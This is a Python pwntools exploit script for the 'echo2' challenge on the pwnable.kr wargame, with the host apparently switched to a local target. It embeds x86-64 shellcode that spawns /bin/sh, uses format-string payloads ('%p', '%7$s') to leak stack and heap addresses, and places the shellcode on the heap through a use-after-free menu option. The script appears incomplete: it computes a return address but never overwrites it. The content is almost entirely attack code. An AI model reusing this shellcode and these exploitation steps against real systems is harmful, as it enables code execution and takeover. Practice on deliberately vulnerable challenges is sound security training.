from pwn import *

host = 'pwnable.kr'
host = '0'
#conn = process('./echo2')
conn = connect(host, 9011)

nombre = 'physics'

"""
- 1. : BOF echo
- 2. : FSB echo
- 3. : UAF echo
- 4. : exit
"""
# http://shell-storm.org/shellcode/files/shellcode-603.php
shellcode = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"

objo = 0x602098

def main():
	conn.recvuntil('name? : ')
	conn.sendline(nombre)
	conn.recvuntil('> ')

	# get ret addr on stack frame
	conn.sendline('2')
	conn.recvuntil(nombre)
	conn.sendline('%p')
	conn.recvline()
	line = conn.recvline()
	leak = int(line[2:], 16)
	print 'stack leak:' + hex(leak)
	ret = leak + 0x3f1348b58
	print 'ret:' + hex(ret)
	conn.recvuntil('> ')

	# get shellcode addr
	conn.sendline('2')
	conn.recvuntil(nombre)
	payload = '%7$s    ' + p64(objo)
	conn.sendline( payload )
	conn.recvline()
	line = conn.recv(4)
	if line[-1] == '\x20':
		line = line[:-1] + '\x00'
	leak = line + '\x00' * 4
	leak = u64(leak)
	print 'heap leak:' + hex(leak)
	shellcode_addr = leak + 0x30
	print 'shellcode addr:' + hex(shellcode_addr)
	conn.recvuntil('> ')

	# place shellcode on heap
	conn.sendline('3')
	conn.sendline( shellcode )
	conn.recvuntil('> ')

		
if __name__ == '__main__':
	try:
		main()
	except KeyboardInterrupt as e:
		pass

#malloc = 0x017086a0
#leak   = 0x01708260
